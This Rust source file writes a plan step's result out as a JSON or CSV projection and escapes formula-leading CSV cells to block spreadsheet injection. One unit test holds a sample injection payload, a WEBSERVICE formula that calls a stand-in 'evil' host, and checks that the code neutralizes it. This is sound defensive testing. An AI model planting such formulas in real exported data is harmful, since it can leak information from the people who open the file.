//! Optional JSON or CSV projection of a prior structured step result.

use std::collections::BTreeMap;
use std::io::Write as _;
use std::path::Path;

use atomicwrites::{AllowOverwrite, AtomicFile};
use serde::{Deserialize, Serialize};
use serde_json::{Map, Value};

use crate::{Plan, PlanError, PlanStep, StepReport};

const MAX_CSV_ROWS: usize = 10_000;
const MAX_CSV_COLUMNS: usize = 32;
const MAX_PROJECTION_BYTES: usize = 1024 * 1024;

/// How a plan projects a prior structured result.
#[derive(Clone, Copy, Debug, Deserialize, Eq, PartialEq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum ProjectFormat {
    /// Write the referenced JSON value.
    Json,
    /// Write an array of objects as RFC 4180 CSV.
    Csv,
}

/// Optional result projection declared on a plan.
#[derive(Clone, Debug, Deserialize, PartialEq, Serialize)]
#[serde(deny_unknown_fields)]
pub struct PlanProject {
    /// Output encoding.
    pub format: ProjectFormat,
    /// Exact `{"$ref":"step#/pointer"}` selecting the projected value.
    pub from: Value,
    /// CSV column names. When empty, the first object's keys are used.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub columns: Vec<String>,
}

/// Compact record of a written projection.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct ProjectionSummary {
    /// Encoding that was written.
    pub format: ProjectFormat,
    /// Job-directory-relative file name.
    pub file: String,
    /// Number of projected array rows, or 1 for a non-array JSON value.
    pub rows: usize,
}

pub(crate) fn validate(project: &PlanProject, steps: &[PlanStep]) -> Result<(), PlanError> {
    let Some(object) = project.from.as_object() else {
        return Err(PlanError::InvalidProject(
            "project.from must be an exact $ref object".to_string(),
        ));
    };
    if object.len() != 1 || !object.contains_key("$ref") {
        return Err(PlanError::InvalidProject(
            "project.from must be an exact $ref object".to_string(),
        ));
    }
    let reference = object
        .get("$ref")
        .and_then(Value::as_str)
        .ok_or_else(|| PlanError::InvalidProject("project.from $ref must be a string".to_string()))?;
    let (target, pointer) = crate::parse_project_reference(reference)?;
    if !steps.iter().any(|step| step.id == target) {
        return Err(PlanError::InvalidProject(format!(
            "project.from references unknown step `{target}`"
        )));
    }
    if !pointer.is_empty() && !pointer.starts_with('/') {
        return Err(PlanError::InvalidProject(
            "project.from JSON pointer must be empty or start with `/`".to_string(),
        ));
    }
    if project.format != ProjectFormat::Csv && !project.columns.is_empty() {
        return Err(PlanError::InvalidProject(
            "project.columns is only accepted for csv".to_string(),
        ));
    }
    if project.columns.len() > MAX_CSV_COLUMNS {
        return Err(PlanError::InvalidProject(format!(
            "project.columns has {} names; the maximum is {MAX_CSV_COLUMNS}",
            project.columns.len()
        )));
    }
    if project
        .columns
        .iter()
        .any(|column| column.is_empty() || column.len() > 64 || column.bytes().any(|byte| byte < b' '))
    {
        return Err(PlanError::InvalidProject(
            "project.columns names must be 1-64 characters without control bytes".to_string(),
        ));
    }
    Ok(())
}

pub(crate) fn summarize(plan: &Plan, steps: &[StepReport]) -> Result<Option<ProjectionSummary>, String> {
    let Some(project) = &plan.project else {
        return Ok(None);
    };
    let (value, rows) = projected_value(project, steps)?;
    let bytes = encode(project, &value)?;
    if bytes.len() > MAX_PROJECTION_BYTES {
        return Err(format!(
            "projected result is {} bytes; the maximum is {MAX_PROJECTION_BYTES}",
            bytes.len()
        ));
    }
    Ok(Some(ProjectionSummary {
        format: project.format,
        file: file_name(project.format).to_string(),
        rows,
    }))
}

pub(crate) fn persist(
    directory: &Path,
    plan: &Plan,
    steps: &[StepReport],
) -> Result<Option<ProjectionSummary>, String> {
    let Some(project) = &plan.project else {
        return Ok(None);
    };
    let (value, rows) = projected_value(project, steps)?;
    let bytes = encode(project, &value)?;
    if bytes.len() > MAX_PROJECTION_BYTES {
        return Err(format!(
            "projected result is {} bytes; the maximum is {MAX_PROJECTION_BYTES}",
            bytes.len()
        ));
    }
    let file = file_name(project.format);
    write_private_bytes(&directory.join(file), &bytes)?;
    Ok(Some(ProjectionSummary {
        format: project.format,
        file: file.to_string(),
        rows,
    }))
}

fn projected_value(project: &PlanProject, steps: &[StepReport]) -> Result<(Value, usize), String> {
    let indexes = steps
        .iter()
        .enumerate()
        .map(|(index, step)| (step.id.clone(), index))
        .collect::<BTreeMap<_, _>>();
    let dummy = PlanStep {
        id: "project".to_string(),
        tool: "project".to_string(),
        arguments: Map::new(),
    };
    let value = crate::resolve_value(&project.from, &dummy, steps, &indexes, &BTreeMap::new())?;
    let rows = match (&project.format, &value) {
        (ProjectFormat::Csv, Value::Array(rows)) => {
            if rows.len() > MAX_CSV_ROWS {
                return Err(format!(
                    "csv projection has {} rows; the maximum is {MAX_CSV_ROWS}",
                    rows.len()
                ));
            }
            rows.len()
        }
        (ProjectFormat::Csv, _) => {
            return Err("csv projection requires the referenced value to be a JSON array".to_string());
        }
        (ProjectFormat::Json, Value::Array(rows)) => rows.len(),
        (ProjectFormat::Json, _) => 1,
    };
    Ok((value, rows))
}

fn encode(project: &PlanProject, value: &Value) -> Result<Vec<u8>, String> {
    match project.format {
        ProjectFormat::Json => serde_json::to_vec_pretty(value)
            .map(|mut bytes| {
                bytes.push(b'\n');
                bytes
            })
            .map_err(|error| error.to_string()),
        ProjectFormat::Csv => encode_csv(value, &project.columns),
    }
}

fn encode_csv(value: &Value, columns: &[String]) -> Result<Vec<u8>, String> {
    let Value::Array(rows) = value else {
        return Err("csv projection requires a JSON array".to_string());
    };
    let headers = if columns.is_empty() {
        csv_headers(rows)?
    } else {
        columns.to_vec()
    };
    if headers.len() > MAX_CSV_COLUMNS {
        return Err(format!(
            "csv projection has {} columns; the maximum is {MAX_CSV_COLUMNS}",
            headers.len()
        ));
    }
    let mut out = Vec::new();
    if !headers.is_empty() {
        let header_cells = headers.iter().map(|header| csv_safe_text(header)).collect::<Vec<_>>();
        write_csv_row(&mut out, header_cells.iter().map(String::as_str));
    }
    for row in rows {
        let object = row
            .as_object()
            .ok_or_else(|| "csv projection rows must be JSON objects".to_string())?;
        let cells = headers
            .iter()
            .map(|header| match object.get(header) {
                Some(Value::String(text)) => csv_safe_text(text),
                Some(Value::Null) | None => String::new(),
                Some(other) => csv_cell(other),
            })
            .collect::<Vec<_>>();
        write_csv_row(&mut out, cells.iter().map(String::as_str));
    }
    Ok(out)
}

fn csv_headers(rows: &[Value]) -> Result<Vec<String>, String> {
    let Some(first) = rows.first() else {
        return Ok(Vec::new());
    };
    let object = first
        .as_object()
        .ok_or_else(|| "csv projection rows must be JSON objects".to_string())?;
    if object.len() > MAX_CSV_COLUMNS {
        return Err(format!(
            "csv projection has {} columns; the maximum is {MAX_CSV_COLUMNS}",
            object.len()
        ));
    }
    Ok(object.keys().cloned().collect())
}

fn csv_cell(value: &Value) -> String {
    match value {
        Value::String(text) => csv_safe_text(text),
        Value::Number(number) => number.to_string(),
        Value::Bool(flag) => flag.to_string(),
        Value::Null => String::new(),
        other => csv_safe_text(&serde_json::to_string(other).unwrap_or_default()),
    }
}

fn csv_safe_text(text: &str) -> String {
    let significant = text.trim_start_matches(|ch: char| ch.is_whitespace() || ch.is_control() || ch == '\u{feff}');
    if significant.starts_with(['=', '+', '-', '@']) {
        let mut escaped = String::with_capacity(text.len() + 1);
        escaped.push('\'');
        escaped.push_str(text);
        escaped
    } else {
        text.to_string()
    }
}

fn write_csv_row<'a, I>(out: &mut Vec<u8>, fields: I)
where
    I: IntoIterator<Item = &'a str>,
{
    let mut first = true;
    for field in fields {
        if !first {
            out.push(b',');
        }
        first = false;
        write_csv_field(out, field);
    }
    out.extend_from_slice(b"\r\n");
}

fn write_csv_field(out: &mut Vec<u8>, field: &str) {
    if field.contains([',', '"', '\n', '\r']) {
        out.push(b'"');
        for byte in field.bytes() {
            if byte == b'"' {
                out.extend_from_slice(b"\"\"");
            } else {
                out.push(byte);
            }
        }
        out.push(b'"');
    } else {
        out.extend_from_slice(field.as_bytes());
    }
}

fn file_name(format: ProjectFormat) -> &'static str {
    match format {
        ProjectFormat::Json => "projection.json",
        ProjectFormat::Csv => "projection.csv",
    }
}

fn write_private_bytes(path: &Path, bytes: &[u8]) -> Result<(), String> {
    let mut options = std::fs::OpenOptions::new();
    options.create(true).truncate(true).write(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt as _;
        options.mode(0o600);
    }
    AtomicFile::new(path, AllowOverwrite)
        .write_with_options(|file| file.write_all(bytes).and_then(|()| file.sync_all()), options)
        .map_err(std::io::Error::from)
        .map_err(|error| format!("could not write {}: {error}", path.display()))?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt as _;
        std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o600))
            .map_err(|error| format!("could not secure {}: {error}", path.display()))?;
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn step(id: &str, result: Value) -> StepReport {
        StepReport {
            id: id.to_string(),
            tool: "browser_evaluate".to_string(),
            ok: true,
            result: Some(result),
            error: None,
        }
    }

    #[test]
    fn csv_projection_quotes_commas_and_uses_named_columns() {
        let plan = Plan {
            version: 1,
            variables: BTreeMap::new(),
            steps: vec![PlanStep {
                id: "extract".to_string(),
                tool: "browser_evaluate".to_string(),
                arguments: Map::new(),
            }],
            project: Some(PlanProject {
                format: ProjectFormat::Csv,
                from: json!({"$ref":"extract#/items"}),
                columns: vec!["title".to_string(), "price".to_string()],
            }),
        };
        let steps = [step(
            "extract",
            json!({"items":[{"title":"Widget, large","price":12},{"title":"Bolt","price":1}]}),
        )];
        let summary = summarize(&plan, &steps).expect("summarize").expect("projected");
        assert_eq!(summary.file, "projection.csv");
        assert_eq!(summary.rows, 2);
        let (value, _) = projected_value(plan.project.as_ref().expect("project"), &steps).expect("value");
        let csv = encode(plan.project.as_ref().expect("project"), &value).expect("csv");
        assert_eq!(
            String::from_utf8(csv).expect("utf8"),
            "title,price\r\n\"Widget, large\",12\r\nBolt,1\r\n"
        );
    }

    #[test]
    fn csv_projection_neutralizes_formula_leading_text() {
        let plan = Plan {
            version: 1,
            variables: BTreeMap::new(),
            steps: vec![PlanStep {
                id: "extract".to_string(),
                tool: "browser_evaluate".to_string(),
                arguments: Map::new(),
            }],
            project: Some(PlanProject {
                format: ProjectFormat::Csv,
                from: json!({"$ref":"extract#/items"}),
                columns: vec!["=cmd".to_string(), "n".to_string()],
            }),
        };
        let steps = [step("extract", json!({"items":[{"=cmd":"=1+1","n":2}]}))];
        let (value, _) = projected_value(plan.project.as_ref().expect("project"), &steps).expect("value");
        let csv = encode(plan.project.as_ref().expect("project"), &value).expect("csv");
        assert_eq!(String::from_utf8(csv).expect("utf8"), "'=cmd,n\r\n'=1+1,2\r\n");
        let tabbed = [step(
            "extract",
            json!({"items":[{"=cmd":"\t=WEBSERVICE(\"http://evil\")","n":2}]}),
        )];
        let (value, _) = projected_value(plan.project.as_ref().expect("project"), &tabbed).expect("value");
        let csv = encode(plan.project.as_ref().expect("project"), &value).expect("csv");
        assert_eq!(
            String::from_utf8(csv).expect("utf8"),
            "'=cmd,n\r\n\"'\t=WEBSERVICE(\"\"http://evil\"\")\",2\r\n"
        );
    }

    #[test]
    fn json_projection_fails_on_a_missing_pointer() {
        let plan = Plan {
            version: 1,
            variables: BTreeMap::new(),
            steps: vec![PlanStep {
                id: "extract".to_string(),
                tool: "browser_evaluate".to_string(),
                arguments: Map::new(),
            }],
            project: Some(PlanProject {
                format: ProjectFormat::Json,
                from: json!({"$ref":"extract#/missing"}),
                columns: Vec::new(),
            }),
        };
        let steps = [step("extract", json!({"items":[]}))];
        let error = summarize(&plan, &steps).expect_err("missing pointer");
        assert!(error.contains("did not match"));
    }
}
